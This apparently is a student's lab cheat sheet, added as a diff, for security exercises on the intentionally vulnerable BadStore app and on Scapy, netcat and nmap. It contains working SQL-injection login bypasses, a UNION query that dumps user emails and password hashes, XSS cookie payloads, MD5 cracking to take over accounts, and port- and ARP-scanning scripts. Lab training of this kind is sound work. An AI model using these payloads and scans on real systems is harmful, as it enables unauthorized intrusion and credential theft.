@@ -1,0 +1,405 @@
+1a Badstore
+Go to browser 
+Put ipaddress
+Login as admin' -- 
+Go to what's new
+Add to cart 
+View cart 
+Inspect
+Storage 
+Change the value
+Again view cart 
+
+1b
+sudo python3
+from scapy.all import *
+myframe=Ether()/IP() 
+myframe.show()
+myframe.summary()
+
+
+packet=Ether()/ARP()
+packet.show()
+packet.summary()
+
+
+1c
+
+nano port_scan.sh
+inside
+#!/bin/bash
+
+host="www.example.com"
+
+read -p "Enter the starting port number: " start_port
+read -p "Enter the ending port number: " end_port
+
+for ((port=start_port; port<=end_port; port++))
+do
+    echo "Scanning port $port..."
+    nc -zv -w1 "$host" "$port" 2>&1
+done
+
+chmod +x port_scan.sh
+
+./port_scan.sh
+
+------------------------------------------------------
+
+2a badstore
+Go to browser 
+Put ipaddress
+Login as joe@supplier.com' --
+View previous orders
+
+2b
+sudo python3
+from scapy.all import *
+pac=sniff(count=10)
+pac.summary()
+
+
+2c
+1st termianl
+nc -vlp 1234
+2nd terminal
+nc localhost 1234
+
+1st terminal 
+Ifconfig
+Copy inet ipaddr
+nc -vlp 1234
+2nd terminal 
+nc ipaddr 1234
+------------------------------------------------------
+
+
+3a
+sudo python3
+from scapy.all import *
+result, unanswered = traceroute(["www.example.com", "www.google.com"], maxttl=20)
+result.show()
+
+3b
+nc www.example.com 80
+GET / HTTP/1.1
+Host: example.com
+
+nc www.example.com 80
+HEAD / HTTP/1.1
+Host: example.com
+
+3c 
+nmap -sn 127.0.0.1
+
+nmap -sn 127.0.0.1/24
+
+------------------------------------------------------
+
+
+4a
+ifconfig
+nano scanner.py
+inside 
+import scapy.all as scapy
+
+request = scapy.ARP()
+request.pdst = "10.0.2.15/24"   
+
+broadcast = scapy.Ether()
+broadcast.dst = "ff:ff:ff:ff:ff:ff"
+
+request_broadcast = broadcast / request
+
+clients = scapy.srp(request_broadcast, timeout=1)[0]
+
+print("IP Address\t\tMAC Address")
+print("-----------------------------------------")
+
+for element in clients:
+    print(element[1].psrc + "\t\t" + element[1].hwsrc)
+
+
+sudo python3 scanner.py
+
+4b
+
+nc -l -p 5000
+Go to browser 
+http://localhost:5000
+
+in terminal after few seconds 
+
+HTTP/1.1 200 OK
+Content-Type: text/plain
+
+Hello from Netcat!
+
+Go again to browser and see the output 
+
+4c 
+nmap -sn 127.0.0.100-200
+nmap -sn 127.0.0.0/24
+
+------------------------------------------------------
+
+
+5a Badstore
+Go to browser 
+Put ipaddress
+Login as admin' -- 
+What's new
+Add item to cart 
+Inspect 
+Remove max length 
+Add script
+<script>alert(document.cookie)</script>
+
+5b
+same as 1c
+
+5c 
+nmap 127.0.1.1
+
+nmap -sV 127.0.1.1
+
+------------------------------------------------------
+
+
+6a Badstore(same as 5a)
+<script>alert(document.cookie)</script>
+
+6b 
+nmap -O 127.0.1.1
+
+nmap -A 127.0.1.1
+
+6c Badstore
+Go to browser 
+Put ipaddress
+Login as admin' -- 
+What's new
+Add to cart
+Inspect 
+Remove max length 
+Add script 
+xx' IN (itemnum,sdesc,ldesc) union select email,passwd,123,123 from userdb LIMIT 2 -- 
+Copy the item of admin 
+Md5 reverse 
+Back to login admim with new password 
+Change url to admin
+View sales report to add user to do it
+Right click , view page source 
+Search for hidden
+------------------------------------------------------
+
+7a
+sudo python3
+
+from scapy.all import *
+packet = IP(dst="8.8.8.8")/ICMP()
+send(packet)
+open wwire shark and search for icmp then re run the below command 
+send(IP(dst="8.8.8.8")/ICMP())
+
+Go to wire shark  ,any ,icmp
+
+Again in terminal 
+ans, unans = sr(packet, timeout=2)
+ans[0]
+ans[0][1].show()
+
+7b
+nc -l -p 8080 < image.jpg
+
+or 
+
+printf "HTTP/1.1 200 OK\r\nContent-Type: image/jpeg\r\nConnection: close\r\n\r\n" | cat - lion.jpeg | nc -l -p 8080
+
+http://localhost:8080
+
+OR
+nc -l -p 5000
+Run http://localhost:5000
+Go back to terminal
+Enter twice 
+HTTP/1.1 200 OK
+Content-Type- text/html; charset=UTF.8
+Server: nooblinux
+Enter twice
+<!DOCTYPE html>
+<title>kushi</title>
+<h1>apple</h1>
+<img src=" ">
+Enter twice and ctrl c
+Go back to browser and check 5000
+
+7c Badstore
+Go to browser 
+Put ipaddress
+Login as admin' -- 
+What's new
+Add to cart
+Inspect 
+Remove max length 
+Add script 
+x' union select count(itemnum),count(itemnum),count(itemnum),count(itemnum) from
+itemdb -- 
+
+------------------------------------------------------
+
+8a
+
+import socket(enter twice)
+
+target_ip = socket.gethostbyname("www.example.com")
+print("Target IP:", target_ip)
+
+Enter twice
+
+from scapy.all import *
+import socket
+
+# Resolve domain to IP
+target_ip = socket.gethostbyname("www.example.com")
+
+# Ports to scan
+ports = [22, 80, 443]
+
+print(f"Scanning target: {target_ip}")
+
+# SYN Scan
+for port in ports:
+    packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
+    response = sr1(packet, timeout=1, verbose=0)
+
+    if response:
+        if response.haslayer(TCP):
+            if response[TCP].flags == "SA":
+                print(f"Port {port} is OPEN")
+                
+                # Send RST to close connection properly
+                send(IP(dst=target_ip)/TCP(dport=port, flags="R"), verbose=0)
+                
+            elif response[TCP].flags == "RA":
+                print(f"Port {port} is CLOSED")
+    else:
+        print(f"Port {port} is FILTERED or NO RESPONSE")
+
+8b 
+nmap --script vuln 127.0.1.1
+
+nmap --script vuln 127.0.1.1 -oN txtgh.txt
+
+8c Badstore
+Go to browser 
+Put ipaddress
+Login as  supplier as joe@supplier.com
+.....
+Login as admin
+Change url to admin 
+Add user do it
+Change url to admin
+Copy the password and make it to md5 
+Again login supplier as with new user and password 
+------------------------------------------------------
+
+
+9a 
+same as 7b
+9b
+same as 4c
+
+9c Badstore(2a)
+
+------------------------------------------------------
+
+
+10a
+nano icmp_monitor.py
+
+from scapy.all import *
+
+# Callback function (runs every time a packet is captured)
+def packet_callback(packet):
+    
+    # Check if packet has IP layer
+    if packet.haslayer(IP):
+        
+        # Check if protocol is ICMP (protocol number = 1)
+        if packet[IP].proto == 1:
+            print(f"ICMP packet detected from {packet[IP].src} to {packet[IP].dst}")
+
+# Start sniffing
+sniff(prn=packet_callback, filter="icmp", store=0)
+
+
+sudo python3 icmp_monitor.py
+
+in another terminal run
+ping 8.8.8.8
+
+10b
+same as 5c
+
+10c Badstore
+
+Go to browser 
+Put ipaddress
+Login as admin' -- 
+In url change it to admin
+View sales report to show current user(.bizz)
+Copy password and make it to md5
+Copy the email of .bizz
+Go to login 
+Login with .bizz with new password 
+------------------------------------------------------
+
+
+11a
+nano scap.py 
+import scapy.all as scapy
+
+request = scapy.ARP()
+request.pdst = "192.168.5.0/24"
+
+broadcast = scapy.Ether()
+broadcast.dst = "ff:ff:ff:ff:ff:ff"
+
+request_broadcast = broadcast / request
+
+clients = scapy.srp(request_broadcast, timeout=1, verbose=False)[0]
+
+for element in clients:
+    print(element[1].psrc + "  " + element[1].hwsrc)
+
+ sudo python3 scap.py 
+
+
+11b
+same as 7b
+
+11 c Badstore(5a)
+
+------------------------------------------------------
+
+12 a
+nano traceroute.py
+from scapy.all import *
+
+# Perform traceroute to multiple targets
+result, unanswered = traceroute(
+    ["www.example.com", "www.google.com"],
+    maxttl=20
+)
+
+# Display result
+result.show()
+
+sudo python3 traceroute.py
+
+12b
+same as 7b
+
+12 c
+Badstore(5a)
